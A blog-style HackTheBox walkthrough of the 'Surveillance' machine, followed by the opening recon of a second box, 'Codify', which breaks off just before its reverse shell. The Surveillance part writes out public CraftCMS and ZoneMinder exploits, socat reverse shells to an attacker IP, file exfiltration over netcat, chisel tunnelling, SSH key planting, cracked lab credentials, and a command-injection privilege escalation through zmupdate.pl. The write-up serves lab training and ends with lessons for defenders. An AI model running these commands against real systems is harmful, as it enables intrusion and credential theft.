Both of the pages with HTTP 404 show exactly what you might assume:
Last but not least, the really interesting one was /index.php?p=actions/redirect:
I sent this to Burp repeater to play around with it a bit. Unfortunately I couldn&rsquo;t get it to redirect me to any page, local or external (ex. a webserver I started from my attacker box). I found an Issue on the CraftCMS github repo talking about this redirect action, but apparently it was fixed before version 4.0 (the box is running version 4.4.14 - see below).
So, while the open-redirect was a good hunch, it no longer applies&hellip; I&rsquo;ll have to keep looking.
Exploring the Website The website appears to be a landing page for a company that installs and configures surveillance equipment, like security cameras and smart door controls:
Checking the reference to Craft CMS mentioned in the footer, the website claims to be using version 4.4.14, which is not vulnerable to anything I saw in searchsploit earlier.
As seen during directory enumeration, attempting to visit the /admin page redirects to a login:
Even though searchsploit didn&rsquo;t reveal any exploits for Craft CMS, I decided to try doing a quick web search for &ldquo;CraftCMS vulnerability 4.4.14&rdquo;. The very first result was a NIST CVE entry with a score of 9.8 &#x1f44a; It&rsquo;s for CVE-2023-41892 and has a link at the bottom to some PoC code, apparently already submitted as a Metasploit module.
FOOTHOLD CVE-2023-41892 Looking through some other PoC code for this CVE, it looks like it&rsquo;s exploited by doing an insecure file upload of an image payload that exploits an Imagick vulnerability. To be honest, I would have never found this myself!
I checked to see if I had that exploit already locally:
Yep, there it is! I&rsquo;ll try it out:
sudo ufw allow from $RADDR to any port 4444,8000 proto tcp # In MSFconsole set RHOSTS 10.10.11.245 set RPORT 80 set LHOST tun0 set SSL false It didn&rsquo;t work though. To be fair, it didn&rsquo;t pass the check either:
Drats. I went looking for other exploits. A quick search on Github for CVE-2023-41892 gave three results; I chose to try the Python one with the most stars first, which (at the time of writing this) is this exploit by @Faelian. The exploit itself was completely point-and-shoot:
git clone https://github.com/Faelian/CraftCMS_CVE-2023-41892.git chmod +x craft-cms.py ./craft-cms.py http://surveillance.htb &#x1f44f;Excellent! Now to make a reverse shell and do as the exploit says (delete shell.php behind me). It looks like socat is available on the target, so I&rsquo;ll do a socat reverse shell:
# On attacker box: bash rlwrap socat -d TCP-LISTEN:4444 STDOUT # On target box: socat TCP:10.10.14.9:4444 EXEC:bash Upgrade the shell For more details, please see my guide on upgrading the shell. Here&rsquo;s what I did on this box:
which python python3 perl bash # python3 is present python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; [Ctrl+Z] stty raw -echo; fg [Enter] [Enter] export TERM=xterm-256color export SHELL=bash USER FLAG Enumeration: www-data I’ll follow my usual Linux User Enumeration strategy. To keep this walkthrough as brief as possible, I’ll omit the actual procedure of user enumeration, and instead just jot down any meaningful results:
There are three users with home directories: matthew, zoneminder, and root
In the parent directory of where I got a reverse shell, there is an .env file with MySQL credentials (see below)
The box has lots of tools: nc, netcat, socat, curl, wget, python3, perl, php, tmux
Netstat shows a couple services listening to local connections, probably HTTP and MySQL: www-data can write to several directories. Notably, there are a bunch of mentions to zm in several of the directories.
find / -user $USER 2&gt;/dev/null | grep -v &#39;^\\(/sys\\|/proc\\|/run\\)&#39; | grep -v vendor I&rsquo;ll check out some of these directories after initial enumeration: /tmp/zm, /var/log/zm, /usr/share/zoneminder, /var/cache/zoneminder, and /var/lib/zm &#x1f6a9;
Ok, so that&rsquo;s three leads to investigate:
MySQL credentials from .env file - probably for listener on 127.0.0.1:3306 Listener on 127.0.0.1:8080 (probably a webserver) All those zm and zoneminder directories. Lead #1: MySQL As mentioned above, there is an .env file in /var/www/html/craft. It looks like we have some MySQL credentials in there.
# The application ID used to to uniquely store session and cache data, mutex locks, and more CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7 # The environment Craft is currently running in (dev, staging, production, etc.) CRAFT_ENVIRONMENT=production # The secure key Craft will use for hashing and encrypting data CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_ # Database connection settings CRAFT_DB_DRIVER=mysql CRAFT_DB_SERVER=127.0.0.1 CRAFT_DB_PORT=3306 CRAFT_DB_DATABASE=craftdb CRAFT_DB_USER=craftuser CRAFT_DB_PASSWORD=CraftCMSPassword2023! CRAFT_DB_SCHEMA= CRAFT_DB_TABLE_PREFIX= # General settings (see config/general.php) DEV_MODE=false ALLOW_ADMIN_CHANGES=false DISALLOW_ROBOTS=false Getting my tools So that I can connect to MySQL comfortably from my attacker box, I&rsquo;ll start up a proxy. For this, I&rsquo;ll use chisel. But first, I need to get chisel onto the target. I&rsquo;ll stand up a python http server from my attacker machine to host my standard toolbox, which contains chisel:
# Open up a firewall port for the http server and for chisel server sudo ufw allow from $RADDR to any port 8000,9999 proto tcp cd ~/MyToolbox # Run chisel and background it (or just use another terminal window/tab) ./chisel server --port 9999 --reverse --key MyS3cr3tK3y &amp; # Start the webserver to serve the Toolbox to the target python3 -m http.server 8000 ☝️ Note: I already have proxychains installed on my attacker machine, and my /etc/proxychains.conf file ends with:
... socks5 127.0.0.1 1080 #socks4 127.0.0.1 9050 Then, on the target box:
# Set up a hidden directory in tmp to download tools to mkdir -p /tmp/.Tools cd /tmp/.Tools # Download each tool that might be useful, such as chisel wget http://10.10.14.3:8000/chisel &amp;&amp; chmod 755 chisel # Form the proxy connection and background it ./chisel client 10.10.14.3:9999 R:1080:socks &amp; Back on my attacker box, I like to test the proxy connection by doing a banner-grab of the python webserver hosting my toolbox. By doing this, I&rsquo;ve tested the whole round-trip connection (attacker -&gt; target -&gt; attacker):
proxychains whatweb http://10.10.14.9:8000 Now that I have a proxy set up, I&rsquo;ll connect to the database using the credentials I found in the .env file: craftuser : CraftCMSPassword2023!
proxychains mysql -h 127.0.0.1 -D craftdb -u craftuser -p show tables; # found table: users describe users; # username, email, password, etc select username, password, hasDashboard, admin from users; Excellent, there&rsquo;s a password hash. Maybe I&rsquo;ll be able to crack it?
Finding &amp; cracking hashes &#x1f6ab; Wrong way. Skip this part if you are short on time.
Although the $2y gives it away, we can verify that this is a bcrypt has by using name-that-hash:
&#x1f91e; Ok, I&rsquo;ll toss it into john and hope for a result:
echo &#39;$2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe&#39; &gt;&gt; hash.txt WORDLIST=/usr/share/wordlists/rockyou.txt john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt hashcat -m 3200 hash.txt $WLIST While that is running, I&rsquo;ll check out all those zm / zoneminder directories&hellip;
Lead #3: zm and zoneminder dirs The /usr/share/zoneminder directory is especially interesting. There appears to be a subdirectory for a webserver, and another for a database! I&rsquo;ll tar them up and send it to my attacker box for analysis:
# On attacker box: sudo ufw allow from $RADDR to any port 4445 proto tcp nc -lvnp 4445 &gt; zoneminder.tar.gz # On target box: cd /usr/share tar -czvf /tmp/.Tools/zoneminder.tar.gz ./zoneminder cd /tmp/.Tools nc -nv 10.10.14.9 &lt; zoneminder.tar.gz # After a short while, terminate the connection from attacker [Ctrl+C] # Then, on BOTH boxes do checksum shasum zoneminder.tar.gz # they match The db directory holds a file zm_create.sql, clearly a database initialization script, with a reference to an admin user and their password hash:
There are also a bunch of other logs of updates to the database, but I&rsquo;ll check that later. For now, I&rsquo;ll add that hash to the list and restart my cracking:
[Ctrl+C] echo &#39;$2b$12$NHZsm6AM2f2LQVROriz79ul3D6DnmFiZC.ZK5eqbF.ZWfwH9bqUJ6&#39; &gt;&gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt Upon further inspection, it appears to use InnoDB, and holds all the data necessary for viewing camera streams - presumably security cameras.
Neither hashcat nor john seem to be able to crack these hashes.
Lead #2: Webserver on port 8080 Now that I have a socks5 proxy running using chisel, it&rsquo;s easy to check out the webserver that&rsquo;s listening on the target box on port 8080. Just open it in the browser, using proxychains.
&#x261d;&#xfe0f; I had to close all of my tabs in that browser before attempting to connect to this other one over proxychains. It was trying to pipe all kinds of random web requests through the proxy. Best to just keep it isolated.
proxychains firefox http://127.0.0.1:8080 I tried some obvious/default credentials. I already knew from the zm_create.sql file that admin should be a valid user, but didn&rsquo;t know a password. No luck. In lieu of another obvious lead, I&rsquo;ll go back to enumeration.
Back to linpeas Linpeas seems to have found something interesting:
It also highlighted a few files inside /var/www/html/craft/, the directory where I initially entered with the webshell (and reverse shell). &#x1f914; Did I look through this fully? I&rsquo;m not so sure that I did - I found that .env file and got way off track, thinking that was my best lead.
Surveillance db backup Taking another look at that directory, there is a subdirectory /storage that seems interesting. Even better, inside /storage is a backup - surveillance--2023-10-17-202801--v4.4.14.sql.zip. &#x1f638; It looks like a zip of a database backup script. I&rsquo;ll transfer the zip to my attacker box so I can analyze it more comfortably.
# On attacker box: nc -lvnp 4445 &gt; surveillance--2023-10-17-202801--v4.4.14.sql.zip # On target box: nc -nv 10.10.14.9 &lt; surveillance--2023-10-17-202801--v4.4.14.sql.zip # After a short while, terminate the connection from attacker [Ctrl+C] # Then, on BOTH boxes do checksum shasum surveillance--2023-10-17-202801--v4.4.14.sql.zip # they match There was only one file within the zip, so I manually looked through it. I found something very interesting:
That looks like a password hash for the admin user, but it&rsquo;s not even salted!
There&rsquo;s a perfect tool for cracking unsalted hashes: the website https://crackstation.net/. It has a massive database of unsalted hashes and their corresponding passwords, in a variety of formats. Better yet, it&rsquo;s almost instantaneous because it&rsquo;s simply a lookup table.
I plugged that hash into crackstation.net and - as I had hoped - it found a password right away! &#x1f601;
Alright, so we have the credential admin : starcraft122490 for the surveillance webserver. I&rsquo;ll try it out on the http://surveillance.htb/admin/login page:
&#x1f611; Nope. It&rsquo;s not a valid credential anymore for the Craft CMS site. But maybe there&rsquo;s some credential re-use at play? I&rsquo;ll try the zm website on port 8080:
&#x1f635; What?! Nice! I&rsquo;ll admit, I wasn&rsquo;t expecting that.
I took a thorough look through the web app itself. As the database scripts indicated, ZoneMinder looks like the system that you&rsquo;d use to monitor a bunch of camera feeds from. You can add cameras, groups, and pull video &ldquo;montages&rdquo;. Since there are no cameras registered, the only important-looking information was:
The listening RTP ports for cameras The security configuration. It could be downgraded, but there is no point in doing that now that I have a valid login. What about credential re-use. If I&rsquo;m really lucky, this is the password for matthew:
ssh matthew@$RADDR # use password &#34;starcraft122490&#34; &#x1f389; Alright! Success. The SSH connection drops you into /home/matthew, adjacent to the user flag. Simply cat it out for the points:
cat user.txt ROOT FLAG Enumeration: matthew I&rsquo;ll repeat my usual Linux User Enumeration strategy. These are the conspicuous results:
Linpeas highlighted some things&hellip; honestly, I don&rsquo;t know what to make of it: Checking the kernel version with uname -a shows that this box is running a surprisingly old Linux kernel: 5.15.0-89-generic. It looks like it might be vulnerable to DirtyPipe. I&rsquo;ll check that out next &#x1f6a9; DirtyPipe &#x1f6ab; Wrong way. Skip this part if you are short on time.
HackTheBox has a blog post regarding CVE-2022-0847 aka &ldquo;DirtyPipe&rdquo;, if you want to read more about it. It mentions that this vulnerability was patched in 5.15, but only at 5.15.25 (after the kernel version of this box)
I checked searchsploit for a DirtyPipe exploit and, of course, there was one present:
The exploit is a C program. Thankfully, the target has a gcc already. I&rsquo;ll transfer the source code over to the target using my python webserver.
After transferring the C code, I compiled with gcc -o dirtypipe 50808.c and ran it. The exploit relies on hijacking an existing SUID program, so I got a list of all SUID binaries:
find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2&gt;/dev/null | grep -v &#39;/proc&#39; I tried the exploit using both /usr/bin/passwd and /usr/bin/sudo, but unfortunately neither worked &#x1f937;&zwj;&#x2642;&#xfe0f;.
Next, I tried another DirtyPipe exploit that works slightly differently - the one the HTB article suggests. It writes a new, known password into /etc/passwd for the root user, so you can escalate using that. Seemed promising, but it didnt work either.
While doing that, I did notice something though: there were a whole bunch of binaries (actually a bunch are perl scripts) in /usr/bin that were conspicuously prefixed with &ldquo;zm&rdquo; - probably for zoneminder&hellip;
&#x1f914; I bet I need to pivot to the user zoneminder for privilege escalation.
Note to self: there is also /etc/zm which is not accessible to matthew. Might be important later?
Pivot to zoneminder It&rsquo;s clear that the ZoneMinder web app is being ran by the user zoneminder. So it seems like the clear choice to try to use the web app to pivot to the user. Is there an exploit for it?
First, I&rsquo;ll need to find out what version it&rsquo;s running. I remember seeing the version written down somewhere in the web app itself, so I simply opened the page with proxychains firefox http://127.0.0.1:8080 and logged back in using the admin : starcraft122490 credentials from earlier. The version number is on the righthand side of the banner:
Ok, so it&rsquo;s running v1.36.32. Now I&rsquo;ll check searchsploit:
Only 51071.py is applicable. However, it&rsquo;s a Log injection &amp; Stored XSS &amp; CSRF Bypass&hellip; Fine but not idea - I&rsquo;ll look on Github and see if I can find an RCE exploit for it.
Thankfully, a simple search on github for &ldquo;zoneminder CVE exploit&rdquo; showed a short list of exploits, one of which definitely applies to v1.36.32, and is actually written by the same author as the CraftCMS exploit I used earlier!
&#x1f605; Probably not a coincidence.
The exploit looks very easy to use, and even includes its own checks. See this repo to download it. Again, it looks pretty much point-and-shoot.
Thankfully I still have my socks5 proxy going, so exploiting zoneminder was no trouble at all:
proxychains ./zoneminder.py http://127.0.0.1:8080 &#39;socat TCP:10.10.14.9:4445 EXEC:bash&#39; I&rsquo;m very happy to say that it worked like a perfectly. Thank you again, @Faelian!
&#x2b50; Reader: if you used that exploit I encourage you to leave that repo a star. It&rsquo;s very handily written and worked instantly.
The user zoneminder has a home directory, so I&rsquo;ll go ahead and plant an SSH key so I don&rsquo;t need to re-exploit the box.
First, on my attacker box, generate a key and base-64 encode it:
# used passphrase &#34;c0nd0r&#34;: ssh-keygen -t rsa -b 4096 chmod 700 ./id_rsa # copy output to clipboard base64 -w 0 id_rsa.pub &gt; id_rsa.pub64 &amp;&amp; cat id_rsa.pub64 Then, on the target box, make an SSH directory and plant the key:
mkdir -p ~/.ssh cd ~/.ssh echo &#34;c3NoLXJz[...snip...]thbGkK&#34; | base64 -d &gt; authorized_keys Now back on the attacker box, go ahead and connect using SSH:
ssh -i ./id_rsa zoneminder@$RADDR Great - that was successful &#x1f44d;
Enumeration: zoneminder As is my usual first step when I reach a new user, I checked what they&rsquo;re able to sudo, with sudo -l:
Aha! I knew all those &ldquo;zm&rdquo; scripts in /usr/bin looked suspicious! &#x1f601;
Script analysis I archived the scripts together and transferred them to my attacker machine so I could analyze them more comfortably:
# On target box: cd /usr/bin tar -czvf /tmp/.Tools/perl-scripts.tar.gz ./zm[a-zA-Z]*.pl # On attacker box: scp -i ./id_rsa zoneminder@$RADDR:/tmp/.Tools/perl-scripts.tar.gz ./perl-scripts.tar.gz tar -zxvf perl-scripts.tar.gz There is a LOT of code here. I don&rsquo;t think I can do a good job of manually reviewing all of this code for vulnerabilities.
It doesn&rsquo;t help that I&rsquo;m not very good with perl &#x1f611;
After reading through some of the code, I noticed that there were a few calls to qx, which executes shell commands. Perhaps one of these could lead to command injection?
grep -E &#39;qx\\(&#39; ./zm[a-zA-Z]*pl That shows zmcamtool.pl, zmdc.pl, zmfilter.pl, zmpkg.pl, zmsystemctl.pl, zmtelemetry.pl, zmupdate.pl, and zmvideo.pl. One of these is probably the privesc vector.
zmcamtool.pl &#x1f6ab; Wrong way. Skip this part if you are short on time.
For example, this below snippet of zmcamtool.pl seems vulnerable, right? Usage of the script is this:
zmcamtool.pl [--user=&lt;dbuser&gt; --pass=&lt;dbpass&gt;] [--import [file.sql] [--overwrite]] [--export [name]] [--topreset id [--noregex]] i.e. the database username and password are controlled inputs.
my ( $host, $port ) = ( $Config{ZM_DB_HOST} =~ /^([^:]+)(?::(.+))?$/ ); my $command = &#39;mysqldump -t --skip-opt --compact -h&#39;.$host; $command .= &#39; -P&#39;.$port if defined($port); if ( $dbUser ) { $command .= &#39; -u&#39;.$dbUser; if ( $dbPass ) { $command .= &#39; -p&#39;.$dbPass; } } my $name = $ARGV[0]; if ( $name ) { if ( $name =~ /^([A-Za-z0-9 ,.&amp;()\\/\\-]+)$/ ) { # Allow alphanumeric and &#34; ,.&amp;()/-&#34; $name = $1; $command .= qq( --where=&#34;Name = &#39;$name&#39;&#34;); } else { print &#34;Invalid characters in Name\\n&#34;; } } $command .= &#34; zm Controls MonitorPresets&#34;; my $output = qx($command); my $status = $? &gt;&gt; 8; if ( $status || logDebugging() ) { chomp( $output ); print( &#34;Output: $output\\n&#34; ); } So it seems like I should be able to inject a command simply by terminating the mysqldump command and tacking on another one, and I could use either the dbUser or dbPass variables to do so. However, this doesn&rsquo;t work in practice:
sudo /usr/bin/zmcamtool.pl --export --user=&#39;zmuser&#39; --pass=&#39;ZoneMinderPassword2023; touch /tmp/.Tools/ITWORKED&#39; But all I get as output is this cryptic error: Insecure dependency in \`\` while running with -T switch at /usr/bin/zmcamtool.pl line 366. I even get this error when using the program as it was intended:
sudo /usr/bin/zmcamtool.pl --export --user=&#39;zmuser&#39; --pass=&#39;ZoneMinderPassword2023&#39; Clearly a bug! &#x2639;&#xfe0f;
A web search about this error brought me to this StackOverflow question. Apparently, you get that message when running a Perl program with the -T switch and the program attempts to perform an insecure operation (like qx(...))on an unsanitized input that originates from outside the program. Apparently, Perl has this concept of &ldquo;tainted&rdquo; variables; a variable that can be controlled externally then used without sanitization is considered &ldquo;tainted&rdquo;. I had no idea! Pretty neat, Perl.
In short, the above code only &ldquo;detaints&rdquo; the $name variable, and throws this error because I&rsquo;ve included input for pass without &ldquo;detainting&rdquo; it.
zmfilter.pl &#x1f6ab; Wrong way. Skip this part if you are short on time.
This code in zmfilter.pl would work, if only I could connect to the database and introduce a filter of type AutoExecuteCmd:
&#x1f914; I did find a password for the database earlier on, using linpeas. I&rsquo;ll try logging in using that password:
mysql -h localhost -D zm -u zoneminder -pZoneMinderPassword2023 # nope mysql -h localhost -D zm -u zm -pZoneMinderPassword2023 # nope mysql -h localhost -D zm -u root -pZoneMinderPassword2023 # nope Hmm. Maybe I missed something in that file? The file was /usr/share/zoneminder/www/api/app/Config/database.php. I&rsquo;ll grep it:
grep -B 10 -A 10 ZoneMinderPassword2023 /usr/share/zoneminder/www/api/app/Config/database.php Oh, duh! The username is zmuser, not &ldquo;zm&rdquo; or &ldquo;zoneminder&rdquo;
mysql -h localhost -D zm -u zmuser -pZoneMinderPassword2023 # yep! Inside the database is the Filters table:
Great, I&rsquo;ll just find one filter, set the AutoExecute bit, and write an AutoExecuteCmd to escalate privilege (maybe copy over an SUID bash?). For now, I&rsquo;ll just try a touch:
Even then, it still doesn&rsquo;t work&hellip; The script complains that it can&rsquo;t find the filter:
I got a similar error whether I used any combination of quotation marks or even --filter_id=3
zmupdate.pl After checking zmpkg.pl, zmsystemctl.pl, and zmtelemetry.pl, I finally found some other code that looks vulnerable, this time in zmupdate.pl.
Just like in the previous scripts, I searched the script for any instances of &ldquo;qx(&rdquo; and gave special attention to those spots.
my ( $host, $portOrSocket ) = ( $Config{ZM_DB_HOST} =~ /^([^:]+)(?::(.+))?$/ ); my $command = &#39;mysqldump&#39;; if ($super) { $command .= &#39; --defaults-file=/etc/mysql/debian.cnf&#39;; } elsif ($dbUser) { $command .= &#39; -u&#39;.$dbUser; $command .= &#39; -p\\&#39;&#39;.$dbPass.&#39;\\&#39;&#39; if $dbPass; } if ( defined($portOrSocket) ) { if ( $portOrSocket =~ /^\\// ) { $command .= &#39; -S&#39;.$portOrSocket; } else { $command .= &#39; -h&#39;.$host.&#39; -P&#39;.$portOrSocket; } } else { $command .= &#39; -h&#39;.$host; } my $backup = &#39;/tmp/zm/&#39;.$Config{ZM_DB_NAME}.&#39;-&#39;.$version.&#39;.dump&#39;; $command .= &#39; --add-drop-table --databases &#39;.$Config{ZM_DB_NAME}.&#39; &gt; &#39;.$backup; print(&#34;Creating backup to $backup. This may take several minutes.\\n&#34;); ($command) = $command =~ /(.*)/; # detaint print(&#34;Executing &#39;$command&#39;\\n&#34;) if logDebugging(); my $output = qx($command); my $status = $? &gt;&gt; 8; if ( $status || logDebugging() ) { chomp( $output ); print( &#34;Output: $output\\n&#34; ); } It&rsquo;s remarkably similar to the snippet I showed earlier in zmcamtool.pl: both build up a mysqldump command through successive concatenation. This one, however, &ldquo;detaints&rdquo; the user-controlled input in a horrendously insecure way &#x1f601;
($command) = $command =~ /(.*)/; is what you do when you want to bypass the whole &ldquo;taint&rdquo; mechanism.
The usage of the script is like this:
zmupdate.pl -c,--check | -f,--freshen | -v&lt;version&gt;,--version=&lt;version&gt; [-u &lt;dbuser&gt; -p &lt;dbpass&gt;] The vulnerable runs within the sub patchDB, which is only called if a version is specified. It looks like I should be able to inject a command using either the -u or -p arguments. I just need to include an extra command then bypass the rest of the command (ex. with echo):
sudo /usr/bin/zmupdate.pl --version=1.24.2 -u &#39;zmuser; touch /tmp/.Tools/zm-test/ITWORKED; echo&#39; -p &#39;ZoneMinderPassword2023&#39; While I was playing with that, I had watch -n 05 /tmp/.Tools/zm-test running in another pane.
Alright, it worked! Should be easy to escalate to root now &#x1f609;
sudo /usr/bin/zmupdate.pl --version=1.24.2 -u &#39;zmuser; cp /usr/bin/bash /tmp/.Tools/zm-test/bash; chmod 4755 /tmp/.Tools/zm-test/bash; echo&#39; -p &#39;ZoneMinderPassword2023&#39; Finally, this worked. Just escalate with ./bash -p and read the flag with cat &#x1f920;
cat /root/root.txt LESSONS LEARNED Attacker Google first, then enumerate. As soon as you fingerprint some software on your target, go straight to a search engine and explore what known vulnerabilities exist. There&rsquo;s no benefit to &ldquo;re-inventing the wheel&rdquo; when searching for vulnerabilities. If you want the extra learning, put that brainpower to use in writing a new exploit or scanner for the vulnerability instead.
Manually verify privesc scripts. I accidentally wasted quite a bit of time on this box when seeking the privilege escalation to zoneminder. In truth, I had already seen a mention of the file I needed to examine, back when I ran linpeas for the first time. However, I didn&rsquo;t loop back and examine the file that it highlighted. Leading to my next point&hellip;
Keep a queue of &ldquo;leads&rdquo; in your notes as you&rsquo;re working through a box. Even if it&rsquo;s just a tiny reference to other notes you&rsquo;ve taken, it&rsquo;s an absolutely invaluable practice for keeping yourself on-track and progressing towards a solution.
Grep for insecure code. This can be part of a &ldquo;working backwards&rdquo; approach: if you already know what effect you want some code to produce, you can grep through the code to see what might possibly produce that effect. From there, continue working backwards until you find user-controlled inputs - once you work all the way backwards, you might have found your exploit!
Defender Mind your backups. Try to think of which users&rsquo; sensitive info might be contained in a backup. Then, among that group, whomever has the tightest security should be the holder of the backup file. Naturally, this is a little more challenging when a backup might contain multiple users&rsquo; sensitive info and they are effectively peers of the same privilege and security.
Stay updated. This box relied on the attacker leveraging two CVEs, both of which had already been patched for the current versions of their software. Be sure to do your updates in a timely manner, especially for public-facing systems like Craft CMS.
Don&rsquo;t circumvent security controls. Privilege escalation to root on this box required that we abuse some ZoneMinder scripts. While perl has a concept of &ldquo;tainted&rdquo; variables, the script that led to privesc contained the anti-pattern of &ldquo;untainting&rdquo; a variable by running it through the match-anything regex .* - clearly a bad idea. If you&rsquo;re tempted to bypass a well-intentioned security mechanism like this, take a hard look at yourself and how you got this point.
`,url:"https://4wayhandshake.github.io/walkthrough/surveillance/"},"https://4wayhandshake.github.io/walkthrough/codify/":{title:"Codify",tags:["NodeJS","Sandbox Escape","SQLite","Password Cracking","MySQL","Wildcard Injection"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Codify is an easy-rated Linux box that demonstrates just how badly things can go when producing small / indie web apps in the NodeJS environment. In the modern context of tech leaning heavily on open-source projects, Codify highlights an increasingly relevant issue: how do we deal with open-source dependencies when those packages go stale, unmaintained, or otherwise EOL? While this box was especially easy, it was an absolute delight to solve.
Follow your instincts and don&rsquo;t waste too much time on rigorous recon: Codify does a great job of laying out clues to follow. A little clue-following and research leads right into a foothold. On this box, you&rsquo;ll need to escalate to another user before reaching the user flag. The root flag was also a fun exercise in following instincts and not blowing too much time on enumeration. Have some fun with this one! I sure did &#x1f601;
RECON nmap scans For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3000/tcp open ppp To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA) |_ 256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://codify.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) 3000/tcp open http Node.js Express framework |_http-title: Codify Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;vuln&#39; $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http |_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities. |_http-dombased-xss: Couldn&#39;t find any DOM based XSS. |_http-csrf: Couldn&#39;t find any CSRF vulnerabilities. 3000/tcp open ppp To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
PORT STATE SERVICE VERSION 67/udp open|filtered tcpwrapped 68/udp open|filtered tcpwrapped 69/udp open|filtered tftp 158/udp open|filtered tcpwrapped 520/udp open|filtered route 998/udp open|filtered tcpwrapped 1434/udp open|filtered ms-sql-m 4500/udp open|filtered tcpwrapped 5000/udp open|filtered tcpwrapped 32768/udp open|filtered omad 49152/udp open|filtered unknown 49188/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=codify.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results. Now I&rsquo;ll check for subdomain vhosts of codify.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v No new results from that either. I&rsquo;ll move on to directory enumeration on http://codify.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; OUTPUT=&#34;fuzzing/directory&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o $OUTPUT-ffuf-$DOMAIN -of json -e php,asp,js,html -timeout 4 -v # I often favor this one, using Gobuster # gobuster dir -w $WLIST -u http://$DOMAIN \\ # --random-agent -t 10 --timeout 5s -f -e \\ # --status-codes-blacklist 400,401,402,403,404,405 \\ # --output &#34;$OUTPUT-gobuster-$DOMAIN.txt&#34; \\ # --no-error Directory enumeration against http://codify.htb/ gave the following:
Exploring the Website The real functionality of the website is on the /editor page:
There are a couple of clues written on the front page:
Codify is a simple web application that allows you to test your Node.js code easily. With Codify, you can write and run your code snippets in the browser without the need for any setup or installation. &hellip; Codify uses sandboxing technology to run your code. This means that your code is executed in a safe and secure environment, without any access to the underlying system. Therefore this has some limitations.
If you follow the &ldquo;limitations&rdquo; link (shown above), it provides even more detail:
Restricted Modules: child_process, fs
Module Whitelist: url, crypto, util, events, assert, stream, path, os, zlib
Then if you go to the /about there is another hint:
The vm2 library is a widely used and trusted tool for sandboxing JavaScript. It adds an extra layer of security to prevent potentially harmful code from causing harm to your system. We take the security and reliability of our platform seriously, and we use vm2 to ensure a safe testing environment for your code.
The above blurb kindly even links to the vm2 repository. I immediately checked out the Issues log, searching for anything security related. There were two notable issues submitted. In one of them, a user is suggesting that they make some kind of security policy for the repo, due to the public nature of disclosing security-related via an Issues page&hellip;
That user, very helpfully, even points to two of the Issue submissions that make these vulnerabilities public: one of them is this issue, reporting a sandbox escape of vm2. The author of the issue wasn&rsquo;t overly obvious about what the sandbox escape was, so I investigated the comments on the thread. One at the bottom piqued my interest:
This comment links to a repo describing CVE-2023-29199, and includes a link to a gist with PoC code for performing the sandbox escape. I eagerly tried out the PoC code on the /editor page. Of course, it had no visible effect (it probably would have been visible if I were watching the server&rsquo;s console log). To try it out in a way that would be reflected onto the console log on /editor, I modified the code to read a file instead. Much to my amazement, it worked perfectly:
FOOTHOLD Sandbox escape into RCE I&rsquo;ll try turning this sandbox escape into a reverse shell. But first, I wanted to try out some characters important to the shell, like a pipe &lsquo;|&rsquo; character. Initial tests were successful, so I&rsquo;ll do a reverse shell next:
